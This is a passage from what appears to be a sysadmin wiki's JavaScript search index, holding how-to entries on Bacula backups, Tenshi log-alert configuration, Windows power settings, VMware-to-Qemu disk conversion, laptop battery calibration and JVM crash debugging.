this language:\nFileSet: What to backup? Client: Who to backup? Schedule: When to backup? Pool: Where to backup? (i.e., On which volume?) Volume: a simple physical medium (cartridge, or simple file) on which Bacula writes your backup data Pools: group Volumes so that a backup is not restricted to the capacity of a single Volume Although the basic options are specified in the Pool resource in the Director’s configuration file, the actual Pool is managed by the Bacula Catalog. It contains information from the Pool resource (bacula-dir.conf) as well as information about all Volumes that have been added to the Pool. Volumes are normally added manually from the Console using the label command.\nFor Bacula to read or write to a physical Volume, it must be software-labeled so that Bacula is assured that the correct Volume is mounted. This is normally done manually from the Console using the label command.\nDirector: To define the name of the Director and its password for authentication of the Console program. There should be only one Director resource definition in the configuration file. If you have either /dev/random or bc on your machine, Bacula will generate a random password during the configuration process, otherwise, it will be left blank. Job: To define backup and restore Jobs, and to link Client, FileSet, and Schedules resources to be used together for each Job. JobDefs: Optional resource designed to provide default values for Job resources. Schedule: To define when a Job should be automatically launched by Bacula’s internal scheduler. FileSet: To define the set of files to be backed up for each client. Client: To define which Client is to be backed up. Storage: To define on which physical device volumes will be mounted. Pool: To define which pool of volumes can be used for a given Job Catalog: To define the database to keep lists of backed up files and volumes where they were backed up. Messages: To define the recipients (or log files) of error and information messages. Director linkWe’ll modify the catalog here so it can connect to the MySQL database. Edit your file /etc/bacula/bacula-dir.conf and modify these lines to adapt them to your needs:\nCatalog { Name = MySQL dbname = bacula user = bacula password = \"bacula_password\" DB Address = 'localhost DB Port = 3306 } To get all the information for the director, I invite you to access this page: https://www.bacula.org/fr/rel-manual/Configurer_le_Director.html\n"
            }
        );
    index.add(
            {
                id:  645 ,
                href: "\/Tenshi_:_Analyse_des_logs_syst%C3%A8me\/",
                title: "Tenshi: System Log Analysis",
                description: "How to install and configure Tenshi for analyzing system logs and receiving automated email alerts for specific events",
                content: "Introduction and Installation linkThe analysis of log files is a good compromise to the regular absence of consideration in companies for these files that contain crucial information for protecting systems against intrusions performed by hackers within the networks themselves.\nNote: this document was written in 2006; certain versions and configurations of the software used may be different from those mentioned; please refer to the official project sites in case of problems.\nDedicating a person to this analysis is not economically feasible in many companies, so implementing software that automates this process as much as possible is a lesser evil, provided that the number of reported alerts remains reasonable while maintaining the quality of the alerts that will be escalated; this requires fine-tuning and is therefore often complex to implement.\nLogWatch, Logsentry, Logcheck, and Swatch are the most well-known of these solutions in the open source world; through this document we will introduce Tenshi, a log analyzer formerly known as Wasabi.\nTenshi offers multiple functionalities: email reports, high processing capacity, use of regular expressions (perl regexp), exception handling and filtering.\nThese features are combined with a very simple installation and configuration flexibility that will delight those most resistant to this type of application: a single file based on a concept of objects or groups of objects, intuitive syntax and internal “crontab”.\nAlso worth noting is the minimal resources needed for this analysis, enabling the processing of multiple files with a large number of entries.\nDebian linkWith Debian, Tenshi installs as follows:\napt-get install tenshi Sources linkFor installation from the sources:\nroot@ns30074:~ # wget http://www.gentoo.org/~lcars/tenshi/tenshi-latest.tar.gz --01:03:14-- http://www.gentoo.org/~lcars/tenshi/tenshi-latest.tar.gz =\u003e `tenshi-latest.tar.gz' Résolution de www.gentoo.org... 38.99.64.201, 66.219.59.46, 66.241.137.77 Connexion vers www.gentoo.org[38.99.64.201]:80...connect requête HTTP transmise, en attente de la réponse...302 Found Emplacement: http://www.gentoo.org/~lcars/tenshi/tenshi-latest.tar.gz --01:03:16-- http://www.gentoo.org/~lcars/tenshi/tenshi-latest.tar.gz =\u003e `tenshi-latest.tar.gz' Résolution de dev.gentoo.org... 140.211.166.183 Connexion vers dev.gentoo.org[140.211.166.183]:80...connect requête HTTP transmise, en attente de la réponse...200 OK Longueur: 19,220 [application/x-gzip] 100%[==========\u003e] 19,220 71.91K/s 01:03:17 (71.66 KB/s) - tenshi-latest.tar.gz sauvegardé [19220/19220] Tenshi is a program based on the PERL language; for sending reports via email, it requires the installation of the additional “Net::SMTP” module.\nThis module provides an API for the SMTP protocol; its installation can be done through another module that allows access to the CPAN archive (Comprehensive PERL Archive Network) which groups all homologated PERL modules together with their various documentation.\nTo start the CPAN connection:\nroot@ns30074:~/tenshi-0.4 # perl -e shell -MCPAN cpan shell -- CPAN exploration and modules installation (v1.7601) ReadLine support available (try 'install Bundle::CPAN') For newcomers to using the CPAN module, you can retrieve and consult information related to the “Net::SMTP” module with the following command:\ncpan\u003e i Net::SMTP CPAN: Storable loaded ok Going to read /root/.cpan/Metadata Database was generated on Tue, 20 Sep 2005 01:59:21 GMT CPAN: LWP::UserAgent loaded ok Fetching with LWP: ftp://ftp.pasteur.fr/pub/computing/CPAN/authors/01mailrc.txt.gz Going to read /root/.cpan/sources/authors/01mailrc.txt.gz CPAN: Compress::Zlib loaded ok Fetching with LWP: ftp://ftp.pasteur.fr/pub/computing/CPAN/modules/03modlist.data.gz Going to read /root/.cpan/sources/modules/03modlist.data.gz Going to write /root/.cpan/Metadata Strange distribution name [Net::SMTP] Module id = Net::SMTP DESCRIPTION Interface to Simple Mail Transfer Protocol CPAN_USERID GBARR (Graham Barr ) CPAN_VERSION 2.29 CPAN_FILE G/GB/GBARR/libnet-1.19.tar.gz DSLI_STATUS adpf (alpha,developer,perl,functions) MANPAGE Net::SMTP - Simple Mail Transfer Protocol Client INST_FILE /usr/share/perl/5.8/Net/SMTP.pm INST_VERSION 2.26 The installation of the module is done as follows:\ncpan\u003e install Net::SMTP Running install for module Net::SMTP ......... /usr/bin/make install -- OK We can see that the installation was performed correctly; we can now disconnect from CPAN:\ncpan\u003e exit Let’s look at the Tenshi archive that we previously retrieved; first decompress and unarchive it:\nroot@ns30074:~ # tar -zxvf tenshi-latest.tar.gz tenshi-0.4/ tenshi-0.4/tenshi.debian-init tenshi-0.4/Makefile tenshi-0.4/LICENSE tenshi-0.4/README tenshi-0.4/tenshi.conf tenshi-0.4/tenshi.8 tenshi-0.4/tenshi tenshi-0.4/tenshi.gentoo-init tenshi-0.4/INSTALL tenshi-0.4/tenshi.ebuild tenshi-0.4/Changelog tenshi-0.4/COPYING tenshi-0.4/tenshi.solaris-init tenshi-0.4/CREDITS Then access the directory that was recently created and contains the files needed to install the application:\nroot@ns30074:~ # cd tenshi-0.4/ List the directory to see its structure:\nroot@ns30074:~/tenshi-0.4 # ls Changelog CREDITS LICENSE README tenshi.8 tenshi.debian-init tenshi.gentoo-init COPYING INSTALL Makefile tenshi tenshi.conf tenshi.ebuild tenshi.solaris-init The next two operations consist of creating a “tenshi” user and a group of the same name that will govern the execution of Tenshi on your system:\nroot@ns30074:~/tenshi-0.4 # useradd tenshi root@ns30074:~/tenshi-0.4 # groupadd tenshi Before proceeding with the installation itself, it’s necessary, depending on the operating system and distribution, to adjust the configuration of the “Makefile” file; for me it was necessary to change the installation path of the manual pages by modifying line 9 of the file on a “debian-like” system:\nroot@ns30074:~ # updatedb | locate \"man8/\" | more /usr/share/man/man8/update-passwd.8.gz root@ns30074:~/tenshi-0.4 # vi Makefile Replace “mandir = /usr/man” with “mandir = /usr/share/man/”.\nYou can now install Tenshi on the system:\nroot@ns30074:~/tenshi-0.4 # make install install -D tenshi /usr/sbin/tenshi [ -f /etc/tenshi/tenshi.conf ] || \\ install -g root -m 0644 -D tenshi.conf /etc/tenshi/tenshi.conf install -d /usr/share/doc/tenshi-0.4 install -m 0644 README INSTALL CREDITS LICENSE COPYING Changelog /usr/share/doc/tenshi-0.4/ install -g root -m 0644 tenshi.8 /usr/share/man//man8/ install -g root -m 755 -d /var/lib/tenshi Configuration linkLet’s examine the configuration file part by part to understand how Tenshi works, which will also introduce us to the mechanisms that govern log analysis.\nOnce the installation is complete, we can move on to the next step, which is configuration: this is done through a single file called “tenshi.conf” located at /etc/tenshi/tenshi.conf\nroot@ns30074:~/tenshi-0.4 # vi /etc/tenshi/tenshi.conf At the beginning of the file, we find the “generic” configurations, including the setting of the previously mentioned “tenshi” user and “tenshi” group created on the system that will own the processes related to the future launch of Tenshi:\n## ## tenshi 0.4 sample conf ## # general settings set uid tenshi set gid tenshi The following configuration line requires some adjustments. By default, we find “set pidfile /var/run/tenshi.pid”, but the files governing PIDs are located in the /var/run/ directory, which by default belongs to the “root” user:\nls -l /var/ | grep run drwxr-xr-x 17 root root 4096 2006-06-16 07:57 run The following operations must be performed to solve this problem:\nCreate a directory specific to the Tenshi PID root@ns30074:~/tenshi-0.4 # mkdir /var/run/tenshi Set the necessary permissions for the future creation of PID files in this directory when Tenshi launches root@ns30074:~/tenshi-0.4 # chown tenshi:root /var/run/tenshi/ Verify that the previous operation was successful: root@ns30074:~/tenshi-0.4 # ls -l /var/run/ | grep tenshi drwxr-xr-x 2 tenshi root 4096 2006-06-16 01:49 tenshi Then all that remains is to replace the line “set pidfile /var/run/tenshi.pid” with “set pidfile /var/run/tenshi/tenshi.pid” in the configuration file to avoid warnings related to the mentioned problem during future Tenshi launches.\nThe rest of the configuration allows you to define the log files that will be monitored and whose alerts will be reported to you; by default, you’ll find the following two lines:\nset logfile /var/log/messages set logfile /var/log/mail.log Ideally, and to adjust according to the context of your distribution regarding the logging management of various events by “syslogd” or others, you can add the following lines to make this list as exhaustive as possible and the analysis more effective:\nset logfile /var/log/syslog set logfile /var/log/sulog set logfile /var/log/user.log set logfile /var/log/auth.log Next come some optimizations that you can leave by default, unlike the definition of the SMTP server that will be used to send reports if you do not want to use the default one running on “localhost”:\nset sleep 5 set limit 800 set pager_limit 2 set mask ___ set mailserver mail.deimos.fr set subject Tenshi report set hidepid on Tenshi has the unique characteristic of not using the system’s “crontab” for its operation; it’s therefore possible to configure different automation elements directly in the “tenshi.conf” file according to several criteria.\nElements of type “queue” are to be set up via the following syntax: “set queue []”; the default subject is “tenshi report” if you don’t specify specific ones.\nBelow you can see 6 elements configuring the sending from “webmaster@xxx@mycompany.com” to “xxx@mycompany.com” according to different frequencies and periods throughout the day based on their criticality.\nFor the “mail” element, scheduled sending at 6:30 PM of a report every day:\nset queue mail webmaster@xxx@mycompany.com xxx@mycompany.com [30 18 * * *] For the “nf” element, scheduled sending every thirty minutes of a report every day:\nset queue nf webmaster@xxx@mycompany.com xxx@mycompany.com [*/30 * * * *] For the “report” element, scheduled sendings every 2 hours in the interval between 9 AM and 5 PM of a report every day:\nset queue report webmaster@xxx@mycompany.com xxx@mycompany.com [0 9-17/2 * * *] For the “misc” element, scheduled sendings under the same conditions as the previous element:\nset queue misc webmaster@xxx@mycompany.com xxx@mycompany.com [0 9-17/2 * * *] For the “critical” element, scheduled sending immediately for each identified occurrence:\nset queue critical webmaster@xxx@mycompany.com xxx@mycompany.com [now] For the “root” element, scheduled sending immediately for each identified occurrence:\nset queue root webmaster@xxx@mycompany.com xxx@mycompany.com [now] Sending reports to multiple users is also possible to configure; simply replace “xxx@mycompany.com” with “xxx@mycompany.com, root@xxx@mycompany.com” for example.\nFollowing in the file are the exceptions that will allow you not to report information that is not of interest; they are sent to a “trash” element that is not part of the report sending “crontab”:\ntrash ^hub.c trash ^usb.c trash ^uhci.c trash ^sda trash ^Initializing USB trash ^scsi0 : SCSI emulation trash ^Vendor: trash ^Type: trash ^Attached scsi removable trash ^SCSI device sda trash ^sda: Write trash ^/dev/scsi trash ^WARNING: USB trash ^USB Mass Storage trash ^/dev trash ^ISO trash ^floppy0 trash ^end_request trash ^Directory trash ^I/O error: dev 08:(.+), sector Similarly, we remove the indications for repeated entries:\nrepeat ^(?:last message repeated|above message repeats) (\\\\d+) time An example group for the SSHD service; definition of the group:\ngroup ^sshd(?:\\(pam_unix\\))?: All occurrences of the string “sshd: fatal: Timeout before authentication for” regardless of the following characters indicating that an SSH session has been closed due to inactivity for too long; this will be recorded in the reports belonging to the “report” element:\nreport ^sshd: fatal: Timeout before authentication for (.+) All occurrences of the string “critical ^sshd: Illegal user” indicating that an username not conforming to the system has been used for SSH authentication; this will be recorded in the reports belonging to the “critical” element:\ncritical ^sshd: Illegal user All occurrences of the string “sshd: Connection from” regardless of the following characters indicating an established SSH connection; this will be recorded in the reports belonging to the “report” element:\nreport ^sshd: Connection from (.+) All occurrences of the string “sshd: Connection closed” regardless of the following characters indicating a closed SSH session; this will be recorded in the reports belonging to the “report” element:\nreport ^sshd: Connection closed (.+) All occurrences of the string “sshd: Closing connection” regardless of the following characters indicating the ongoing closure of an SSH connection; this will be reported in the reports belonging to the “report” element:\nreport ^sshd: Closing connection (.+) All occurrences of the string “sshd: Found matching (.+) key: (.+)” regardless of the following and intermediate characters indicating that the key proposed for SSH authentication has been found in the list of system keys; this will be recorded in the reports belonging to the “report” element:\nreport ^sshd: Found matching (.+) key: (.+) All occurrences of the string “sshd: Accepted publickey” regardless of the following characters indicating that the public key used for opening an SSH session has been accepted; this will be recorded in the reports belonging to the “report” element:\nreport ^sshd: Accepted publickey (.+) All occurrences of the string “sshd: Accepted rsa for (.+) from (.+) port (.+)” regardless of the following and intermediate characters indicating that the proposed RSA key has been accepted; this will be recorded in the reports belonging to the “report” element:\nreport ^sshd: Accepted rsa for (.+) from (.+) port (.+) All occurrences of the string “sshd(pam_unix): session opened for user root by root(uid=0)” indicating the opening of an SSH session with the root account from the root account; this will be recorded in the reports belonging to the “root” element:\nroot ^sshd\\(pam_unix\\): session opened for user root by root\\(uid=0\\) All occurrences of the string “sshd(pam_unix): session opened for user root by (uid=0)” indicating the opening of an SSH session with the root account; this will be recorded in the reports belonging to the “root” element:\nroot ^sshd\\(pam_unix\\): session opened for user root by \\(uid=0\\) And finally closing the sshd group:\ngroup_end On the same principles, several other groups are to be defined according to your system and its applications/services.\nThe “Sendmail” service with:\ngroup ^sendmail: mail ^sendmail: (.+): to=(.+),(.+)relay=(.+),(.+)stat=Sent(.+) mail ^sendmail: (.+): to=(.+),(.+)relay=(.+),(.+)stat=Sent mail ^sendmail: (.+): from=(.+),(.+)relay=(.+) mail ^sendmail: STARTTLS=client(.+) mail ^sendmail group_end The “Sm-mta” service:\ngroup ^sm-mta: mail ^sm-mta: (.+): to=(.+),(.+)delay=(.+) mail ^sm-mta: (.+): to=(.+),(.+)relay=(.+),(.+)stat=Sent(.+) mail ^sm-mta: (.+): to=(.+),(.+)relay=(.+),(.+)stat=Sent mail ^sm-mta: (.+): to=(.+),(.+)relay=local(.+)stat=Sent(.+) mail ^sm-mta: (.+): to=(.+),(.+)relay=local(.+)stat=Sent mail ^sm-mta: (.+): to=(.+),(.+)stat=Sent(.+) mail ^sm-mta: (.+): to=(.+),(.+)stat=Sent mail ^sm-mta: (.+): from=(.+),(.+)relay=local(.+) mail ^sm-mta: (.+): from=(.+),(.+)relay=(.+) mail ^sm-mta: STARTTLS=server(.+) mail ^sm-mta: STARTTLS=client(.+) trash ^sm-mta:.+User unknown mail ^sm-mta: ETRN mail ^sm-mta group_end The “Ipop3d” service with:\ngroup ^ipop3d: mail ^ipop3d: Login user=(.+) mail ^ipop3d: Logout user=(.+) mail ^ipop3d: pop3s SSL service init from (.+) mail ^ipop3d: pop3 service init from (.+) mail ^ipop3d: Auth user=(.+) mail ^ipop3d: Command stream end of file, while reading mail ^ipop3d: Command stream end of file while reading mail ^ipop3d: AUTHENTICATE LOGIN failure host=(.+) mail ^ipop3d: AUTHENTICATE PLAIN failure host=(.+) mail ^ipop3d: Login failed mail,critical ^ipop3d: group_end The “Imapd” service with:\ngroup ^imapd: mail ^imapd: Login user=(.+) mail ^imapd: Logout user=(.+) mail ^imapd: port (.+) service init from (.+) mail ^imapd: imaps SSL service init from (.+) mail ^imapd: Command stream end of file, while reading mail ^imapd: Command stream end of file while reading mail ^imapd: Authenticated user=(.+) mail ^imapd: AUTHENTICATE LOGIN failure host=(.+) mail ^imapd: AUTHENTICATE PLAIN failure host=(.+) mail ^imapd: Autologout(.+) mail ^imapd: Login failed mail,critical ^imapd: group_end The “login(pam_unix)” service with:\ngroup ^login\\(pam_unix\\): critical ^login\\(pam_unix\\): session opened for user root by root\\(uid=0\\) critical ^login\\(pam_unix\\): session opened for user root by \\(uid=0\\) report ^login\\(pam_unix\\): session closed for user (.+) report ^login\\(pam_unix\\): session opened for user (.+) group_end The “su(pam_unix)” service with:\ngroup ^su\\(pam_unix\\): root,report ^su\\(pam_unix\\): session opened for user root root,report ^su\\(pam_unix\\): session closed for user root(.+) report ^su\\(pam_unix\\): session opened for user (.+) report ^su\\(pam_unix\\): session closed for user (.+) group_end Then all records of the string “netfilter” for filtering will be sent to the “nf” element:\nnf ^netfilter All records of the string “sudo” for commands executed under an account other than the active SHELL account will be sent to the “critical” element:\ncritical ^(?:/usr/bin)?sudo: All records of the string “init” for service launches will be sent to the “critical” element:\ncritical ^init All records of the string “passwd(pam_unix):” for password changes will be sent to the “report” element:\nreport ^passwd\\(pam_unix\\): All other records not matching the previous identification regular expressions will be sent to the “misc” element:\nmisc .* Usage linkWith configurations done, we move on to using Tenshi by putting ourselves in concrete alert cases to receive the corresponding alarms on a predefined email provided that the basic configurations have been properly performed beforehand.\nTenshi functions as a service, which notably implies that you can close the terminal where you launched it without stopping it (equivalent to adding the “\u0026” character at the end of a SHELL command).\nDuring a previous “ls”, you may have noticed the presence of 3 initialization scripts for Linux operating systems (Debian and Gentoo distributions) and Solaris:\nroot@ns30074:~/tenshi-0.4 # ls | grep init tenshi.debian-init tenshi.gentoo-init tenshi.solaris-init We are currently using a “Debian-like” distribution (Ubuntu), so we need to copy the corresponding initialization script into the /etc/init.d/ directory which contains all the service initialization scripts of the system:\nroot@ns30074:~/tenshi-0.4 # cp tenshi.debian-init /etc/init.d/tenshi Test this script:\nroot@ns30074:~/tenshi-0.4 # sh /etc/init.d/tenshi Usage: /etc/init.d/tenshi {start|stop|restart} Add execution rights to the script:\nroot@ns30074:~/tenshi-0.4 # chmod +x /etc/init.d/tenshi Start the Tenshi daemon:\nroot@ns30074:~/tenshi-0.4 # /etc/init.d/tenshi start Starting log monitor: tenshi. Test the effective launch of Tenshi:\nroot@ns30074:~ # ps auwx | grep tenshi tenshi 19424 0.0 1.0 8260 5312 ? Ss 01:51 0:00 /usr/bin/perl /usr/sbin/tenshi tenshi 19425 0.0 0.1 3176 676 ? S 01:51 0:00 /usr/bin/tail -q --follow=name --retry -n 0 /var/log/messages /var/log/mail.log Stop Tenshi:\nroot@ns30074:~/tenshi-0.4 # /etc/init.d/tenshi stop Stopping log monitor: tenshi. Forced stop of Tenshi in case of problems with the scripts:\nroot@ns30074:~/tenshi-0.4 # killall -9 tail tenshi Restart Tenshi:\nroot@ns30074:~/tenshi-0.4 # /etc/init.d/tenshi restart Stopping log monitor: tenshi. Starting log monitor: tenshi. Tenshi can also be launched outside of initialization scripts to, for example, test a configuration file or launch the service with an alternative file. Debug mode is also possible among others, and will be very useful if you encounter a problem particularly with sending emails,\nroot@ns30074:~/tenshi-0.4 # tenshi -h tenshi 0.4 Copyright 2004-2006 Andrea Barisani and Rob Holland Usage: /usr/sbin/tenshi [-c conf_file] [-C|-d|-f|-p] [-P pid_file] -c configuration file -C test configuration syntax -d debug mode -f foreground mode -p profile mode -P pid file -h this help The last point to address, and not the least, are the reports with the alerts that will be sent to you by email. The first is a report from the “report” element for a closure due to inactivity for too long on an active session of the SSH service:\nFrom: webmaster@xxx@mycompany.com To: xxx@mycompany.com Date: Sun, 18 Jun 2006 03:08:33 +0200 X-tenshi-version: 0.4 X-tenshi-hostname: ns30074 Subject: tenshi report [report] ns30074: 1: sshd: fatal: Timeout before authentication for ___ The second example is a report for the “misc” element with an SSH authentication error, as well as the execution of a command by the system “crontab” and the opening of a “pam_unix” session for the root account associated with this previous entry “_/1 _ * * * root /usr/local/rtm/bin/rtm 41 \u003e/dev/null 2\u003e/dev/null” of the “crontab”:\nFrom: webmaster@xxx@mycompany.com To: xxx@mycompany.com Date: Sun, 18 Jun 2006 02:59:07 +0200 X-tenshi-version: 0.4 X-tenshi-hostname: ns30074 Subject: tenshi report [misc] ns30074: 1: sshd: error: PAM: Authentication failure for root from kiko.adsl.nerim.net 1: /USR/SBIN/CRON: (root) CMD (/usr/local/rtm/bin/rtm 41 \u003e/dev/null 2\u003e/dev/null) 1: CRON: (pam_unix) session opened for user root by (uid=0) The log analysis system is functional; all that remains now is to adapt the configuration according to your needs and the time you want to allocate to reading the reports from it.\nIf you would like additional information, two mailing lists are available:\nThe first is for general discussions; to subscribe, simply send a message to tenshi-user+subscribe@lists.inversepath.com and messages for the list should be sent to tenshi-user@lists.inversepath.com\nThe second is dedicated to Tenshi developments; subscribe at tenshi-announce+subscribe@lists.inversepath.com and list messages at tenshi-announce@lists.inversepath.com\nReferences linkhttp://www.secuobs.com/news/07042008-tenshi.shtml\n"
            }
        );
    index.add(
            {
                id:  646 ,
                href: "\/D%C3%A9ployement_de_la_gestion_d%27%C3%A9nergie_sur_un_serveur_pour_ses_clients\/",
                title: "Deploying Power Management on a Server for its Clients",
                description: "Guide on how to deploy power management settings to Windows clients through scripts",
                content: "Batch Script linkHere is the small batch script:\nPowercfg.exe /CREATE \"myPowerScheme\" Powercfg.exe /CHANGE \"myPowerScheme\" /monitor-timeout-dc 20 Powercfg.exe /CHANGE \"myPowerScheme\" /monitor-timeout-ac 20 Powercfg.exe /CHANGE \"myPowerScheme\" /disk-timeout-dc 0 Powercfg.exe /CHANGE \"myPowerScheme\" /disk-timeout-ac 0 Powercfg.exe /CHANGE \"myPowerScheme\" /standby-timeout-dc 0 Powercfg.exe /CHANGE \"myPowerScheme\" /standby-timeout-ac 0 Powercfg.exe /CHANGE \"myPowerScheme\" /hibernate-timeout-dc 0 Powercfg.exe /CHANGE \"myPowerScheme\" /hibernate-timeout-ac 0 Powercfg.exe /SETACTIVE \"myPowerScheme\" Here I just want the monitor to turn off automatically after 20 minutes.\nVBS Integration linkFor those who want to integrate it into the VBS script:\n'***************************************************************************** '### Fonction powermgmt ### 'crée un nouveau schema de gestion d'alimentation et l'applique à l'aide de l'éxecution d'un fichier batch 'Syntaxe : powermgmt Function powermgmt Set objFSO = CreateObject(\"Scripting.FileSystemObject\") Set WshShell = CreateObject(\"wscript.shell\") WshShell.run \"energy_save.bat\", SH_WIDE End Function '***************************************************************************** "
            }
        );
    index.add(
            {
                id:  647 ,
                href: "\/Activer_modules_son_kernel\/",
                title: "Activating Kernel Modules",
                description: "How to enable, disable, and manage kernel modules in BSD and Linux systems",
                content: "BSD Systems linkHere’s the type of command you can use to disable ACPI (among other features) in your BSD kernel:\nconfig -ef /bsd disable acpi quit To re-enable it, simply replace disable with enable.\n"
            }
        );
    index.add(
            {
                id:  648 ,
                href: "\/gestion_de_la_memoire_en_java\/",
                title: "Java Memory Management",
                description: "Documentation about how memory management works in Java and in the JVM",
                content: "Here is documentation on memory management usage. It’s not up to date but it explains very well how a JVM works.\nDocumentation on Java memory management\n"
            }
        );
    index.add(
            {
                id:  649 ,
                href: "\/Convertir_une_image_disque_Vmware_pour_Qemu_ou_Xen\/",
                title: "Converting a VMware Disk Image for Qemu or Xen",
                description: "This guide explains how to convert VMware disk images to be compatible with Qemu or Xen virtualization platforms.",
                content: "Introduction linkI’ve switched to the new Ubuntu, great! Except for one thing: VMware doesn’t work yet, you have to wait for a patch, etc… but I don’t have time to wait!\nVMware is nice and pretty, but it’s becoming annoying. So I decided to use KVM and QTqemu for the graphical interface. And here I am, ready to convert my VMware images.\nConversion linkFor conversion, we’ll first use VMware for preparation and then qemu for the actual conversion:\nvmware-vdiskmanager -r vmware_image.vmdk -t 0 temporary_image.vmdk qemu-img convert -f vmdk temporary_image.vmdk -O raw xen_compatible.img FAQ linkGreat, but my Debian disk won’t boot linkThis happens because if you configured your VMware disk as SCSI, you’ll be using sdx device names. Your Debian busybox will launch, and you’ll need to mount the partition containing /boot and edit the menu.lst file to change the kernel root. Here’s some help:\nmkdir /test mount -t ext3 /dev/hda1 /test vi /test/boot/grub/menu.lst Change this:\nkernel\t/vmlinuz-2.6.18-6-amd64 root=/dev/sda1 ro to:\nkernel\t/vmlinuz-2.6.18-6-amd64 root=/dev/hda1 ro And finally, reboot :-)\n"
            }
        );
    index.add(
            {
                id:  650 ,
                href: "\/Calibrer_la_batterie_de_son_portable\/",
                title: "Calibrating Your Laptop Battery",
                description: "Learn how to properly calibrate a MacBook or MacBook Pro battery to maintain optimal performance and accurate battery life indicators.",
                content: "Introduction linkIf there’s one area where you can read all sorts of contradictory information, it’s about the best way to keep your battery performing as well as possible. This is especially true for Intel CPU laptops where you might get unrealistic figures and sometimes problems.\nA technical note published by Apple on this subject provides the calibration procedure (http://docs.info.apple.com/article.html?path=Mac/10.5/fr/9036.html). Here’s what it contains:\nCalibrating the Battery link Connect the MagSafe power adapter and fully charge your MacBook or MacBook Pro battery until the light on the power adapter turns green and the battery icon in the menu bar indicates a full charge.\nLeave the battery in a fully charged state for at least two hours. You can use your computer during this time as long as the adapter remains connected.\nDisconnect the power adapter while keeping the computer turned on and start using it with the battery as a power source. When the battery is getting low, you will see a warning dialog on the screen.\nKeep using your computer until right before it goes to sleep due to low battery. Save your work and close all applications just before the battery drains to the point where the computer goes to sleep.\nTurn off the computer or allow it to go to sleep for at least five hours.\nConnect the power adapter and leave it connected until the battery is fully charged again. You can use your computer during this time.\nRepeat the calibration process approximately once every two months to maintain optimal battery performance. If you use your MacBook or MacBook Pro irregularly, it’s better to recalibrate the battery at least once a month.\nYou can check the charging capacity of your battery with many software utilities, or simply in the power section of System Information. Sometimes, after a complete calibration, you’ll see the capacity of your battery significantly reduced. It’s not this process that damages it, but regular use. Calibration only tests the battery over a complete cycle to prevent giving you incorrect usage times.\n"
            }
        );
    index.add(
            {
                id:  651 ,
                href: "\/Unix_Toolbox_:_Toutes_les_commandes_utiles\/",
                title: "Unix Toolbox: All Useful Commands",
                description: "A collection of Unix commands and server setup guides providing comprehensive reference for system administrators.",
                content: "I wasn’t sure where to put this little gold mine, so here it is: Unix Toolbox PDF. And here is the updated documentation:\nhttps://cb.vu/unixtoolbox.xhtml\n"
            }
        );
    index.add(
            {
                id:  652 ,
                href: "\/Cryptologie_et_nombres_premiers:_l\u0027algorithme_RSA\/",
                title: "Cryptology and Prime Numbers: The RSA Algorithm",
                description: "Documentation explaining how the RSA algorithm works with prime numbers in cryptology.",
                content: "Here is documentation explaining how the RSA algorithm works:\nPrime Numbers and Cryptology - RSA Algorithm\n"
            }
        );
    index.add(
            {
                id:  653 ,
                href: "\/Debugger_un_crash_de_JVM\/",
                title: "Debugging a JVM Crash",
                description: "How to debug and identify Java Virtual Machine crashes and resolve memory issues with garbage collection",
                content: "Introduction linkYou may have an application that has problems such as crashing, but the port and process remain up anyway. This happened to me particularly with Atlassian’s Confluence wiki.\nProblem linkThe application crashes, yet it still remains up at the process and port level. Therefore, we need to debug the JVM.\nI won’t explain in detail how a JVM works, but here are the basics:\nThe minimum memory allocated to an application is defined by the Xms option. At startup, the application will consume the value of Xms (in this case 1GB). The maximum memory allocated to the application is defined by the Xmx option. The application will therefore reserve (in this case) 1GB of RAM that can be used only by the JVM. For choosing Xms and Xmx values, it’s sufficient to check the memory consumption (generally the application provides this information). Garbage Collections (GC or memory purging) happen regularly when reaching approximately 90% to 95% of Xmx. This frees up memory space from stored objects. The disadvantage is that when this Full GC operates, the application temporarily freezes. During this period, it’s no longer possible to access the application. Full GCs may chain together if the Xmx is too low since they launch too frequently, which can completely freeze the application. Changing Boot Options linkHere’s an example of how to enable loggc which will allow us to see if the JVM is doing too many GCs, or performing a Full GC:\nConfiguration File year=`date '+%y'` month=`date '+%m'` day=`date '+%d'` hour=`date '+%H'` minute=`date '+%M'` time=$hour$minute date=$year$month$day LOGS=/var/www/confluence/logs JAVA_OPTS=\"-Xms1024m -Xmx1024m $JAVA_OPTS -Djava.awt.headless=true -Xloggc:$LOGS/confluencegclog_$date$time.txt -Dcom.sun.management.jmxremote -Djava.net.preferIPv4Stack=true -XX:MaxPermSize=256m\" export JAVA_OPTS These lines are typically placed in a file that will be executed when our Java application launches.\nAnalyzing the Logs linkWhen we examine our logs, we can see if there are too many GCs. For example, here’s a case where everything crashed due to a Full GC:\nconfluencegclog_$date$time.txt 34385.900: [GC 104787K-\u003e104783K(1048064K), 0.0117720 secs] 34385.912: [Full GC 104783K-\u003e104783K(1048064K), 0.5075120 secs] 34386.419: [GC 104783K-\u003e104783K(1048128K), 0.0064380 secs] 34386.426: [Full GC 104783K-\u003e104783K(1048128K), 0.5079230 secs] 34395.908: [GC 104787K-\u003e104783K(1048128K), 0.0115600 secs] 34395.919: [Full GC 104783K-\u003e104783K(1048128K), 0.5082900 secs] 34396.428: [GC 104783K-\u003e104783K(1048128K), 0.0131540 secs] 34396.441: [Full GC 104783K-\u003e104783K(1048128K), 0.5081760 secs] 34405.913: [GC 104787K-\u003e104783K(1048192K), 0.0118660 secs] 34405.925: [Full GC 104783K-\u003e104783K(1048192K), 0.5074950 secs] 34406.432: [GC 104783K-\u003e104783K(1048320K), 0.0124010 secs] 34406.444: [Full GC 104783K-\u003e104783K(1048320K), 0.5082180 secs] 47648.636: [GC 105297K-\u003e104783K(1048128K), 0.0107060 secs] 47648.647: [Full GC 104783K-\u003e104783K(1048128K), 0.5092390 secs] 47649.157: [GC 104783K-\u003e104783K(1048256K), 0.0118660 secs] 47649.168: [Full GC 104783K-\u003e104783K(1048256K), 0.5097090 secs] I also recommend a graphical tool for analyzing GC logs made by HP called HPJmeter available here. Here’s what it looks like - you can very clearly see the Full GC problem:\nIn the image above, we can clearly see that we’re experiencing a Full GC. And in the one below, we can see when it occurs:\nSolutions linkSolution 1: Increasing Xmx linkWe’ll increase the Xmx value as there may not be enough memory. In my case, I increased from 256MB to 1024MB to ensure my problem wasn’t coming from there. In the options, I just changed the Xmx and set Xms equal to Xmx.\nSetting both (Xms and Xmx) to the same value prevents repetitive Garbage Collectors. The disadvantage is that objects won’t be purged as frequently as they should be. This may require manual intervention (planned manual stopping and restarting).\nIf the problem persists, proceed to solution 2.\nSolution 2: The MaxPermSize Option linkEven if increasing Xmx 